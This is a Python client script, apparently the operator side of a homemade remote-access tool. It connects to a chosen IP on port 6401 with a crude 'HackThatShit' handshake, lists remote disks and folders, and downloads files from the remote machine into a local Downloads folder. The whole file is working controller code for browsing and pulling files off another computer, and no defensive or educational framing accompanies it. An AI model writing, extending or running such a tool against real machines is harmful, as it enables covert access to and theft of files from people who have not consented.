from socket import *
import os as os
import time as t

ip = input("<ip>")
port = 6401



connection = socket(AF_INET, SOCK_STREAM)
connection.connect((ip, port))
connection.send("getMyFuckingPassword,ComeOn,HackThatShit".encode())

verif = connection.recv(4096).decode()
if verif == "connected":
   print("successefuly connected")
   print("commands are :\nquit\nrefresh\nback\ngoto <folder>\ndisk <disk>\ndl <file>")
else:
   connection.settimeout(0.000000001)

os.system("cls")

def relocate():
   os.system("cls")
   t.sleep(0.1)
   connection.send("locate".encode())
   path = connection.recv(4096).decode()
   path = path.split("@")
   print("")
   print("location :", path[0])
   print("")
   path.pop(0)
   for i in path:
      print(i)
   print("")


command = [""]
relocate()

while command[0] != "quit":
   command = input(">").split(" ")
   if command[0] == "refresh":
      relocate()
   
   elif command[0] == "back":
      connection.send("back".encode())
      relocate()
   
   elif command[0] == "goto":
      if len(command) > 1:
         for i in range(len(command)-2):
            command[1] += " " + command[i+2]
         connection.send("goto".encode())
         connection.send(command[1].encode())
         check = connection.recv(4096).decode()
         if check == "directoryFound":
            relocate()
         elif check == "directoryNotFound":
            print("Folder does not exist.")
      else:
         print("missing arguments")
   
   elif command[0] == "disk":
      if len(command) > 1:
         connection.send("disk".encode())
         connection.send(command[1].encode())
         check = connection.recv(4096).decode()
         if check == "diskFound":
            relocate()
         elif check == "diskNotFound":
            print("Disk does not exist.")
      else:
         print("missing arguments")
   
   elif command[0] == "quit":
      connection.send("quit".encode())
   
   elif command[0] == "dl":
      dirList = os.listdir()
      exist = False
      for i in dirList:
         if i == "Downloads":
            exist = True
            break
      if exist:
         pass
      else:
         os.mkdir("Downloads")
      path = os.getcwd()+"\Downloads"
      os.chdir(path)
      if len(command) > 1:
         connection.send("request".encode())
         for i in range(len(command)-2):
            command[1] += " " + command[i+2]
         connection.send(command[1].encode())
         check = connection.recv(4096).decode()
         if check == "folderFound":
            ready = connection.recv(1024)
            print("downloading file...")
            newFile = open(command[1], "a")
            line = ""
            while line != "#!-!FINISH!-!":
               line = connection.recv(4096).decode()
               if line != "#!-!FINISH!-!":
                  newFile.write(line)
            newFile.close()
         elif check == "folderNotFound":
            print("Folder does not exist.")
         os.chdir("..")
   else:
      print("Unknow command")




